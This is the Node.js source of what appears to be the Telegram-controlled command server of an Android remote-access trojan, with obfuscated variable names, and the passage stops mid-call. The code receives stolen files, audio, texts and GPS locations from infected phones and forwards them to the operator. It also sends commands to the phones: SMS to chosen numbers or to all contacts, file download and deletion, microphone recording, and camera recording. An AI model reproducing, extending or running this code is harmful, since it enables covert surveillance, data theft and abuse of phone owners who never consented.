process.env.NTBA_FIX_350 = 1; 
process.env.NTBA_FIX_319 = 1; 

const express = require('express'),
  webSocket = require('ws'),
  http = require('http'),
  telegramBot = require('node-telegram-bot-api'),
  uuid4 = require('uuid'),
  multer = require('multer'),
  bodyParser = require('body-parser'),
  axios = require('axios')
require('dotenv').config()

const token = process.env.TOKEN,
  id = process.env.ID,
  address = 'https://www.google.com',
  app = express(),
  appServer = http.createServer(app),
  appSocket = new webSocket.Server({ server: appServer }),
  appBot = new telegramBot(token, { polling: true }),
  appClients = new Map()

// LIMITS INCREASED: Server will accept up to 50MB files now
const upload = multer({ limits: { fileSize: 50 * 1024 * 1024 } })
app.use(bodyParser.json({ limit: '50mb' }))
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }))

let currentUuid = '',
  currentNumber = '',
  currentTitle = ''

app.get('/', function (_0x1b89da, _0x3398a0) {
  _0x3398a0.send(
    '<h1 align="center">\uD835\uDE4E\uD835\uDE5A\uD835\uDE67\uD835\uDE6B\uD835\uDE5A\uD835\uDE67 \uD835\uDE6A\uD835\uDE65\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59\uD835\uDE5A\uD835\uDE59 \uD835\uDE68\uD835\uDE6A\uD835\uDE58\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE5B\uD835\uDE6A\uD835\uDE61\uD835\uDE61\uD835\uDE6E</h1>'
  )
})

// IMPROVED UPLOAD ROUTE WITH HEAVY LOGGING
app.post('/uploadFile', upload.single('file'), (_0x1c67cf, _0x143a37) => {
  console.log('\n--- NEW FILE UPLOAD ATTEMPT ---');
  
  if (!_0x1c67cf.file) {
    console.log('ERROR: Client sent request but NO file was attached.');
    return _0x143a37.status(400).send('');
  }

  const _0x404b56 = _0x1c67cf.file.originalname || 'audio_record.mp3'
  console.log(`FILE RECEIVED! Name: ${_0x404b56} | Size: ${_0x1c67cf.file.size} bytes`);

  appBot.sendDocument(
    id,
    _0x1c67cf.file.buffer,
    {
      caption:
        '\xB0\u2022 \uD835\uDE48\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62 <b>' +
        (_0x1c67cf.headers.model || 'Unknown Device') +
        '</b> \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A',
      parse_mode: 'HTML',
    },
    {
      filename: _0x404b56,
      contentType: _0x1c67cf.file.mimetype || 'application/octet-stream',
    }
  ).then(() => {
    console.log('SUCCESS: File forwarded to Telegram successfully.');
  }).catch(err => {
    console.log('TELEGRAM API ERROR:', err.message);
  });

  _0x143a37.status(200).send('')
})

app.post('/uploadText', (_0x5a02f5, _0x55205a) => {
  appBot.sendMessage(
    id,
    '\xB0\u2022 \uD835\uDE48\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62 <b>' +
      _0x5a02f5.headers.model +
      '</b> \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\n\n' +
      _0x5a02f5.body.text,
    { parse_mode: 'HTML' }
  )
  _0x55205a.send('')
})

app.post('/uploadLocation', (_0xfc380d, _0x48b391) => {
  appBot.sendLocation(id, _0xfc380d.body.lat, _0xfc380d.body.lon)
  appBot.sendMessage(
    id,
    '\xB0\u2022 \uD835\uDE47\uD835\uDE64\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63 \uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62 <b>' +
      _0xfc380d.headers.model +
      '</b> \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A',
    { parse_mode: 'HTML' }
  )
  _0x48b391.send('')
})

appSocket.on('connection', (_0x466cd0, _0x1cf0ae) => {
  const _0x275c2d = uuid4.v4(),
    _0x2cfd1d = _0x1cf0ae.headers.model,
    _0x5409ca = _0x1cf0ae.headers.battery,
    _0x4a1a34 = _0x1cf0ae.headers.version,
    _0x340b05 = _0x1cf0ae.headers.brightness,
    _0x1dd883 = _0x1cf0ae.headers.provider
  _0x466cd0.uuid = _0x275c2d
  appClients.set(_0x275c2d, {
    model: _0x2cfd1d,
    battery: _0x5409ca,
    version: _0x4a1a34,
    brightness: _0x340b05,
    provider: _0x1dd883,
  })
  appBot.sendMessage(
    id,
    '\xB0\u2022 NEW DEVICE IS CONNECTED, DEVELOPED BY @MOGATEAM & @shivayadavv\n\n' +
      ('\u2022 ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>' + _0x2cfd1d + '</b>\n') +
      ('\u2022 ʙᴀᴛᴛᴇʀʏ : <b>' + _0x5409ca + '</b>\n') +
      ('\u2022 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>' + _0x4a1a34 + '</b>\n') +
      ('\u2022 ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>' + _0x340b05 + '</b>\n') +
      ('\u2022 ᴘʀᴏᴠɪᴅᴇʀ : <b>' + _0x1dd883 + '</b>'),
    { parse_mode: 'HTML' }
  )
  _0x466cd0.on('close', function () {
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE3F\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A \uD835\uDE59\uD835\uDE5E\uD835\uDE68\uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59, DEVELOPED BY @MOGATEAM & @shivayadavv\n\n' +
        ('\u2022 ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>' + _0x2cfd1d + '</b>\n') +
        ('\u2022 ʙᴀᴛᴛᴇʀʏ : <b>' + _0x5409ca + '</b>\n') +
        ('\u2022 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>' + _0x4a1a34 + '</b>\n') +
        ('\u2022 ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>' + _0x340b05 + '</b>\n') +
        ('\u2022 ᴘʀᴏᴠɪᴅᴇʀ : <b>' + _0x1dd883 + '</b>'),
      { parse_mode: 'HTML' }
    )
    appClients.delete(_0x466cd0.uuid)
  })
})

appBot.on('message', (_0x2ca88f) => {
  const _0x32d1ff = _0x2ca88f.chat.id
  if (_0x2ca88f.reply_to_message) {
    _0x2ca88f.reply_to_message.text.includes(
      '\xB0\u2022 \uD835\uDE4B\uD835\uDE61\uD835\uDE5A\uD835\uDE56\uD835\uDE68\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE65\uD835\uDE61\uD835\uDE6E \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE64 \uD835\uDE6C\uD835\uDE5D\uD835\uDE5E\uD835\uDE58\uD835\uDE5D \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE4E\uD835\uDE48\uD835\uDE4E'
    ) &&
      ((currentNumber = _0x2ca88f.text),
      appBot.sendMessage(
        id,
        '\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE64 \uD835\uDE69\uD835\uDE5D\uD835\uDE5E\uD835\uDE68 \uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67\n\n\u2022 ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
        { reply_markup: { force_reply: true } }
      ))
    _0x2ca88f.reply_to_message.text.includes(
      '\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE64 \uD835\uDE69\uD835\uDE5D\uD835\uDE5E\uD835\uDE68 \uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67'
    ) &&
      (appSocket.clients.forEach(function _0x52e72d(_0x465249) {
        _0x465249.uuid == currentUuid &&
          _0x465249.send('send_message:' + currentNumber + '/' + _0x2ca88f.text)
      }),
      (currentNumber = ''),
      (currentUuid = ''),
      appBot.sendMessage(
        id,
        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
        {
          parse_mode: 'HTML',
          reply_markup: {
            keyboard: [
              [
                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
              ],
              [
                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
              ],
            ],
            resize_keyboard: true,
          },
        }
      ))
    if (
      _0x2ca88f.reply_to_message.text.includes(
        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE58\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE61\uD835\uDE61 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68'
      )
    ) {
      const _0x1f6562 = _0x2ca88f.text
      appSocket.clients.forEach(function _0x308191(_0x3a189f) {
        _0x3a189f.uuid == currentUuid &&
          _0x3a189f.send('send_message_to_all:' + _0x1f6562)
      })
      currentUuid = ''
      appBot.sendMessage(
        id,
        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
        {
          parse_mode: 'HTML',
          reply_markup: {
            keyboard: [
              [
                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
              ],
              [
                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
              ],
            ],
            resize_keyboard: true,
          },
        }
      )
    }
    if (
      _0x2ca88f.reply_to_message.text.includes(
        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D \uD835\uDE64\uD835\uDE5B \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE59\uD835\uDE64\uD835\uDE6C\uD835\uDE63\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59'
      )
    ) {
      const _0x500514 = _0x2ca88f.text
      appSocket.clients.forEach(function _0x5ccade(_0x1bb0ba) {
        _0x1bb0ba.uuid == currentUuid && _0x1bb0ba.send('file:' + _0x500514)
      })
      currentUuid = ''
      appBot.sendMessage(
        id,
        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
        {
          parse_mode: 'HTML',
          reply_markup: {
            keyboard: [
              [
                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
              ],
              [
                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
              ],
            ],
            resize_keyboard: true,
          },
        }
      )
    }
    if (
      _0x2ca88f.reply_to_message.text.includes(
        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D \uD835\uDE64\uD835\uDE5B \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE59\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE69\uD835\uDE5A'
      )
    ) {
      const _0x217e4d = _0x2ca88f.text
      appSocket.clients.forEach(function _0x174aee(_0x4e86bf) {
        _0x4e86bf.uuid == currentUuid &&
          _0x4e86bf.send('delete_file:' + _0x217e4d)
      })
      currentUuid = ''
      appBot.sendMessage(
        id,
        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
        {
          parse_mode: 'HTML',
          reply_markup: {
            keyboard: [
              [
                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
              ],
              [
                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
              ],
            ],
            resize_keyboard: true,
          },
        }
      )
    }
    if (
      _0x2ca88f.reply_to_message.text.includes(
        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5E\uD835\uDE58\uD835\uDE67\uD835\uDE64\uD835\uDE65\uD835\uDE5D\uD835\uDE64\uD835\uDE63\uD835\uDE5A \uD835\uDE69\uD835\uDE64 \uD835\uDE57\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE58\uD835\uDE64\uD835\uDE67\uD835\uDE59\uD835\uDE5A\uD835\uDE59'
      )
    ) {
      const _0x513bae = _0x2ca88f.text
      appSocket.clients.forEach(function _0x511718(_0x461ab3) {
        _0x461ab3.uuid == currentUuid &&
          _0x461ab3.send('microphone:' + _0x513bae)
      })
      currentUuid = ''
      appBot.sendMessage(
        id,
        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
        {
          parse_mode: 'HTML',
          reply_markup: {
            keyboard: [
              [
                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
              ],
              [
                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
              ],
            ],
            resize_keyboard: true,
          },
        }
      )
    }
    if (
      _0x2ca88f.reply_to_message.text.includes(
        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE68\uD835\uDE5A\uD835\uDE61\uD835\uDE5B\uD835\uDE5E\uD835\uDE5A \uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56 \uD835\uDE69\uD835\uDE64 \uD835\uDE57\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE58\uD835\uDE64\uD835\uDE67\uD835\uDE59\uD835\uDE5A\uD835\uDE59'
      )
    ) {
      const _0x517fdd = _0x2ca88f.text
      appSocket.clients.forEach(function _0x2f88ab(_0x4f49b1) {
        _0x4f49b1.uuid == currentUuid &&
          _0x4f49b1.send('rec_camera_main:' + _0x517fdd)
      })
      currentUuid = ''
      appBot.sendMessage(
        id,
        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
        {
          parse_mode: 'HTML',
          reply_markup: {
            keyboard: [
              [
                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
              ],
              [
                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
              ],
            ],
            resize_keyboard: true,
          },
        }
      )
    }
    if (
      _0x2ca88f.reply_to_message.text.includes(
        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE68\uD835\uDE5A\uD835\uDE61\uD835\uDE5B\uD835\uDE5E\uD835\uDE5A \uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56 \uD835\uDE69\uD835\uDE64 \uD835\uDE57\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE58\uD835\uDE64\uD835\uDE67\uD835\uDE59\uD835\uDE5A\uD835\uDE59'
      )
    ) {
      const _0xf2c05e = _0x2ca88f.text
      appSocket.clients.forEach(function _0x1c2fc4(_0x183617) {
        _0x183617.uuid == currentUuid &&
          _0x183617.send('rec_camera_selfie:' + _0xf2c05e)
      })
      currentUuid = ''
      appBot.sendMessage(
        id,
        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
        {
          parse_mode: 'HTML',
          reply_markup: {
            keyboard: [
              [
                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
              ],
              [
                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
              ],
            ],
            resize_keyboard: true,
          },
        }
      )
    }
    if (
      _0x2ca88f.reply_to_message.text.includes(
        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE69\uD835\uDE5D\uD835\uDE56\uD835\uDE69 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE64\uD835\uDE63 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE69\uD835\uDE56\uD835\uDE67\uD835\uDE5C\uD835\uDE5A\uD835\uDE69 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A'
      )
    ) {
      const _0x5f1498 = _0x2ca88f.text
      appSocket.clients.forEach(function _0x1547d2(_0x523d20) {
        _0x523d20.uuid == currentUuid && _0x523d20.send('toast:' + _0x5f1498)
      })
      currentUuid = ''
      appBot.sendMessage(
        id,
